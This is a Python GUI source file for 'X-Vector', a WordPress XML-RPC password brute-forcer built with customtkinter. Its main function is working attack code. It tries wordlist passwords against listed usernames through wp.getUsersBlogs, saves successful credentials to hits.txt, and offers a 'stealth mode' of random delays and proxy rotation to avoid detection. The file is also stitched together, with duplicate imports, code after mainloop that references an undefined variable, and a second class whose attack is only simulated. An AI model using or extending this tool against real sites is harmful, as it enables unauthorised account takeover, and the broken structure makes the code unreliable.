# gui/main_ui.py
import customtkinter as ctk
from tkinter import filedialog, messagebox
import threading
import json
import os
import tkinter as tk
from tkinter import ttk
from gui.tabs.scanner_tab import ScannerTab
import os
import json
import time
import random
import threading
import xmlrpc.client
import itertools

import customtkinter as ctk
from tkinter import filedialog, messagebox
import tkinter as tk
from datetime import datetime

# === Setup ===
log_file_path = "xvector_log.txt"
session_file = "session.json"
abort_flag = threading.Event()

# Globals
start_time = None
attempt_counter = 0

# === Helper Functions ===
def safe_log(message, level="info"):
    colors = {"info": "white", "success": "green", "error": "red", "warning": "orange"}
    color = colors.get(level, "white")
    log_box.configure(state="normal")
    log_box.insert("end", f"{message}\n", color)
    log_box.see("end")
    log_box.configure(state="disabled")
    try:
        with open(log_file_path, "a", encoding="utf-8") as f:
            f.write(message + "\n")
    except Exception as e:
        print(f"Logging error: {e}")

def browse_wordlist():
    path = filedialog.askopenfilename(filetypes=[("Text files", "*.txt")])
    if path:
        wordlist_entry.delete(0, "end")
        wordlist_entry.insert(0, path)

def browse_proxylist():
    path = filedialog.askopenfilename(filetypes=[("Text files", "*.txt")])
    if path:
        proxy_entry.delete(0, "end")
        proxy_entry.insert(0, path)

def update_speed():
    while not abort_flag.is_set():
        elapsed = (time.time() - start_time) if start_time else 1
        speed = attempt_counter / elapsed
        speed_label.configure(text=f"Speed: {speed:.2f} req/sec")
        time.sleep(1)

def abort_attack():
    abort_flag.set()
    safe_log("[!] Brute force aborted by user.", "warning")

def run_brute_force():
    global attempt_counter, start_time
    abort_flag.clear()
    attempt_counter = 0
    start_time = time.time()

    target = target_entry.get().strip()
    usernames = [u.strip() for u in usernames_box.get("1.0", "end").strip().splitlines()]
    wordlist_path = wordlist_entry.get().strip()
    proxylist_path = proxy_entry.get().strip()

    stealth_mode = stealth_var.get()
    min_delay = float(min_delay_entry.get())
    max_delay = float(max_delay_entry.get())

    if not target or not usernames or not wordlist_path:
        messagebox.showerror("Input Error", "Please fill in all required fields.")
        return

    if not os.path.isfile(wordlist_path):
        messagebox.showerror("File Error", "Password wordlist file not found.")
        return

    # Prepare wordlist
    try:
        with open(wordlist_path, 'r', encoding="utf-8") as f:
            passwords = [line.strip() for line in f if line.strip()]
    except Exception as e:
        messagebox.showerror("File Error", f"Could not read password file:\n{e}")
        return

    # Prepare proxy list if needed
    proxies = []
    if stealth_mode and os.path.isfile(proxylist_path):
        try:
            with open(proxylist_path, 'r', encoding="utf-8") as pf:
                proxies = [p.strip() for p in pf if p.strip()]
            proxy_cycle = itertools.cycle(proxies)
        except Exception as e:
            safe_log(f"[!] Proxy list error: {e}", "error")

    # Resume session if available
    resume_index = 0
    if os.path.exists(session_file):
        if messagebox.askyesno("Resume Session?", "Previous session found. Resume?"):
            try:
                with open(session_file, "r", encoding="utf-8") as sf:
                    session_data = json.load(sf)
                    resume_index = session_data.get("resume_index", 0)
                    safe_log(f"[*] Resuming session at attempt #{resume_index}", "info")
            except Exception as e:
                safe_log(f"[!] Could not resume session: {e}", "error")

    try:
        server = xmlrpc.client.ServerProxy(target)
    except Exception as e:
        safe_log(f"[!] Could not connect to target: {e}", "error")
        return

    hit_found = False

    for idx, user in enumerate(usernames):
        safe_log(f"\n[*] Trying user: {user}", "info")
        for pwd_idx, password in enumerate(passwords):
            if abort_flag.is_set():
                safe_log("[!] Attack aborted!", "warning")
                return

            current_attempt = idx * len(passwords) + pwd_idx

            if current_attempt < resume_index:
                continue  # Skip already tried

            try:
                if stealth_mode and proxies:
                    current_proxy = next(proxy_cycle)
                    safe_log(f"[*] Using proxy: {current_proxy}", "info")
                    # (Proxy would be applied in a custom transport if needed.)

                resp = server.wp.getUsersBlogs(user, password)
                attempt_counter += 1

                if resp:
                    hit = f"[+] SUCCESS: {user}:{password}"
                    safe_log(hit, "success")
                    with open("hits.txt", "a", encoding="utf-8") as hf:
                        hf.write(hit + "\n")
                    hit_found = True
                    break

            except xmlrpc.client.Fault:
                attempt_counter += 1
                pass
            except Exception as e:
                safe_log(f"[!] Error on {user}:{password} -> {e}", "error")
                break

            # Save progress
            try:
                with open(session_file, "w", encoding="utf-8") as sf:
                    json.dump({"resume_index": current_attempt}, sf)
            except Exception as e:
                safe_log(f"[!] Session save error: {e}", "error")

            # Random delay if stealth
            if stealth_mode:
                delay = random.uniform(min_delay, max_delay)
                safe_log(f"[*] Sleeping {delay:.2f}s", "info")
                time.sleep(delay)

        if hit_found:
            break

    # Clean up session if completed
    try:
        if os.path.exists(session_file):
            os.remove(session_file)
    except Exception:
        pass

    if hit_found:
        messagebox.showinfo("Done", "Brute-force completed! Credentials found.")
    else:
        messagebox.showinfo("Done", "Brute-force completed. No valid credentials found.")

    safe_log("\n[*] Brute-force completed.", "success")

# === GUI Setup ===
ctk.set_appearance_mode("dark")
ctk.set_default_color_theme("dark-blue")

app = ctk.CTk()
app.title("X-Vector | WP XML-RPC Brute Forcer (Pro)")
app.geometry("780x720")
app.resizable(False, False)

padding = {"pady": (5, 0)}

# === Target URL ===
ctk.CTkLabel(app, text="Target URL (e.g., https://example.com/xmlrpc.php)").pack(**padding)
target_entry = ctk.CTkEntry(app, width=700)
target_entry.pack(pady=5)

# === Usernames ===
ctk.CTkLabel(app, text="Usernames (one per line)").pack(**padding)
usernames_box = ctk.CTkTextbox(app, height=80, width=700)
usernames_box.insert("0.0", "admin\neditor\nauthor")
usernames_box.pack(pady=5)

# === Wordlist ===
ctk.CTkLabel(app, text="Password Wordlist File").pack(**padding)
wordlist_frame = ctk.CTkFrame(app)
wordlist_frame.pack()
wordlist_entry = ctk.CTkEntry(wordlist_frame, width=500)
wordlist_entry.pack(side="left", padx=5)
ctk.CTkButton(wordlist_frame, text="Browse", command=browse_wordlist).pack(side="left")

# === Proxy List ===
ctk.CTkLabel(app, text="Proxy List (Optional)").pack(**padding)
proxy_frame = ctk.CTkFrame(app)
proxy_frame.pack()
proxy_entry = ctk.CTkEntry(proxy_frame, width=500)
proxy_entry.pack(side="left", padx=5)
ctk.CTkButton(proxy_frame, text="Browse", command=browse_proxylist).pack(side="left")

# === Stealth Settings ===
stealth_var = ctk.BooleanVar()
ctk.CTkCheckBox(app, text="Enable Stealth Mode (Random Delay + Proxy Rotation)", variable=stealth_var).pack(**padding)

# Delay range
delay_frame = ctk.CTkFrame(app)
delay_frame.pack(pady=5)
ctk.CTkLabel(delay_frame, text="Min Delay (s):").pack(side="left", padx=2)
min_delay_entry = ctk.CTkEntry(delay_frame, width=60)
min_delay_entry.insert(0, "1.0")
min_delay_entry.pack(side="left", padx=2)
ctk.CTkLabel(delay_frame, text="Max Delay (s):").pack(side="left", padx=2)
max_delay_entry = ctk.CTkEntry(delay_frame, width=60)
max_delay_entry.insert(0, "3.5")
max_delay_entry.pack(side="left", padx=2)

# === Buttons ===
button_frame = ctk.CTkFrame(app)
button_frame.pack(pady=10)

ctk.CTkButton(button_frame, text="Start Brute Force", fg_color="green", hover_color="darkgreen",
              command=lambda: threading.Thread(target=run_brute_force, daemon=True).start()).pack(side="left", padx=10)

ctk.CTkButton(button_frame, text="Abort", fg_color="red", hover_color="darkred", command=abort_attack).pack(side="left", padx=10)

# === Output Log ===
ctk.CTkLabel(app, text="Output Log").pack()
log_box = ctk.CTkTextbox(app, height=250, width=700, state="disabled")
log_box.pack(pady=(0, 10))

# === Speed ===
speed_label = ctk.CTkLabel(app, text="Speed: 0.00 req/sec")
speed_label.pack()

# Start speed updater
threading.Thread(target=update_speed, daemon=True).start()

app.mainloop()
scanner_tab = ScannerTab(parent_tabview)  # or wherever your CTkTabview or CTkFrame is
scanner_tab.pack(fill="both", expand=True)

class XVectorPro(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title("X-Vector Pro :: WordPress Brute Force GUI")
        self.geometry("720x480")
        self.resizable(False, False)
        self.create_widgets()

    def create_widgets(self):
        tabControl = ttk.Notebook(self)

        self.brute_tab = ttk.Frame(tabControl)
        self.settings_tab = ttk.Frame(tabControl)
        self.log_tab = ttk.Frame(tabControl)

        tabControl.add(self.brute_tab, text='Brute Force')
        tabControl.add(self.settings_tab, text='Settings')
        tabControl.add(self.log_tab, text='Logs')
        tabControl.pack(expand=1, fill="both")

        self.setup_brute_tab()
        self.setup_settings_tab()
        self.setup_log_tab()

    def setup_brute_tab(self):
        ttk.Label(self.brute_tab, text="Target URL (xmlrpc.php):").pack(pady=5)
        self.target_entry = ttk.Entry(self.brute_tab, width=50)
        self.target_entry.pack(pady=5)

        ttk.Label(self.brute_tab, text="Username(s):").pack(pady=5)
        self.user_entry = ttk.Entry(self.brute_tab, width=50)
        self.user_entry.pack(pady=5)

        ttk.Label(self.brute_tab, text="Wordlist Path:").pack(pady=5)
        self.wordlist_entry = ttk.Entry(self.brute_tab, width=50)
        self.wordlist_entry.pack(pady=5)

        ttk.Button(self.brute_tab, text="Start Attack", command=self.start_attack).pack(pady=20)

    def setup_settings_tab(self):
        ttk.Label(self.settings_tab, text="Configuration will go here").pack(pady=10)

    def setup_log_tab(self):
        ttk.Label(self.log_tab, text="Log Output").pack()
        self.log_output = tk.Text(self.log_tab, height=20, width=80)
        self.log_output.pack()

    def log(self, msg):
        self.log_output.insert(tk.END, msg + "\n")
        self.log_output.see(tk.END)

    def start_attack(self):
        url = self.target_entry.get()
        users = self.user_entry.get().split(',')
        wordlist = self.wordlist_entry.get()

        if not os.path.isfile(wordlist):
            messagebox.showerror("Error", "Invalid wordlist path")
            return

        self.log("[+] Starting brute force on: " + url)
        self.log("[*] Using users: " + ', '.join(users))
        self.log("[*] Wordlist: " + wordlist)
        self.log("[!] Attack simulated. Add backend engine.")
